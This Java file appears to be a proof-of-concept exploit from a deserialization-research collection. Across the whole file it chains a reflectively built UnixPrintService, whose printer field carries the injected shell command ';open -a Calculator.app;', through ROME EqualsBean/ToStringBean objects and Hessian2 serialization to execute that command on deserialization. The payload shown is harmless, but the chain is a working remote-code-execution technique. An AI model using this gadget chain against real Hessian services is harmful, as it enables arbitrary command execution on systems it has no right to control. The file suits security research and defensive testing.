package org.su18.serialize.hessian.Rome;

//import com.sun.syndication.feed.impl.EqualsBean;
//import com.sun.syndication.feed.impl.ToStringBean;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.HessianUtils;
import sun.print.UnixPrintService;

import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author su18
 */
public class Rome3 {

	public static void main(String[] args) throws Exception {

		// 创建 UnixPrintService 对象并写入执行命令至 printer 中
		UnixPrintService ups = (UnixPrintService) ClassUtil.createInstanceUnsafely(UnixPrintService.class);
		Field            f   = UnixPrintService.class.getDeclaredField("printer");
		f.setAccessible(true);
		f.set(ups, ";open -a Calculator.app;");

		// 在 mac 上 lpcStatusCom 为 null 导致失败，反射改一下
		Field f4 = UnixPrintService.class.getDeclaredField("lpcStatusCom");
		f4.setAccessible(true);
		f4.set(ups, new String[]{"whatever", "meh"});

		// 之前的逻辑没变
		ToStringBean item = new ToStringBean(UnixPrintService.class, ups);
		EqualsBean   root = new EqualsBean(String.class, "su18");

		HashMap map = new HashMap();
		map.put(root, "su18");

		Field f2 = EqualsBean.class.getDeclaredField("beanClass");
//		Field f2 = EqualsBean.class.getDeclaredField("_beanClass");
		f2.setAccessible(true);
		f2.set(root, UnixPrintService.class);
//		Field f3 = EqualsBean.class.getDeclaredField("_obj");
		Field f3 = EqualsBean.class.getDeclaredField("obj");
		f3.setAccessible(true);
		f3.set(root, item);

		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");

	}

}
